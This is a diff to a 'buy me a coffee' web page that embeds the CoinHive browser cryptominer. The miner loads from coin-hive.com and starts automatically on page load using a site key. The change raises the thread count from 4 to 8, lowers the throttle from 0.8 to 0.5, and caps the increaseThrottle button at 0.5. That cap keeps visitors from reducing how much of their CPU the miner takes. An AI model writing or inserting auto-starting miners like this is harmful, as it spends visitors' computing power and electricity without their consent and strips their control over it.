@@ -13,8 +13,8 @@ description: Buy me a coffee buy giving me some CPU cycles.
 * **Hashes per seconds:** <em id="hashespersecond">0</em><em>H/s</em><br>
 * **Total hashes:** <em id="totalhashes">0</em><em>H</em><br>
 * **Accepted hashes:** <em id="accepted">0</em><em>H</em>
-* **Threads:**  <em id="numthreads">4</em> <em>Threads</em>    <button onclick="addThread();">+</button> <button onclick="removeThread();">-</button>
-* **Throttle:**  <em id="throttle">0.8</em>    <button onclick="increaseThrottle();">+</button> <button onclick="reduceThrottle();">-</button>
+* **Threads:**  <em id="numthreads">8</em> <em>Threads</em>    <button onclick="addThread();">+</button> <button onclick="removeThread();">-</button>
+* **Throttle:**  <em id="throttle">0.5</em>    <button onclick="increaseThrottle();">+</button> <button onclick="reduceThrottle();">-</button>
 * **Info:** <em id="info">Connecting</em>
 <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
 
@@ -23,8 +23,8 @@ description: Buy me a coffee buy giving me some CPU cycles.
 	window.onload = function() {
 		miner = new CoinHive.Anonymous('94Ewh5erEv797iMDCHPDwSqQHFt6dvvd');
 		miner.start();
-		miner.setThrottle(0.8);
-		miner.setNumThreads(4);
+		miner.setThrottle(0.5);
+		miner.setNumThreads(8);
 			// Listen on events
 		miner.on('found', function() { /* Hash found */ })
 		miner.on('accepted', function() { /* Hash accepted by the pool */ })
@@ -60,8 +60,8 @@ description: Buy me a coffee buy giving me some CPU cycles.
 
 	function increaseThrottle() {
 		t = miner.getThrottle();
-		if(t > 0.9) {
-			t = 1
+		if(t > 0.5) {
+			t = 0.5
 		} else {
 			t += 0.1;
 		}
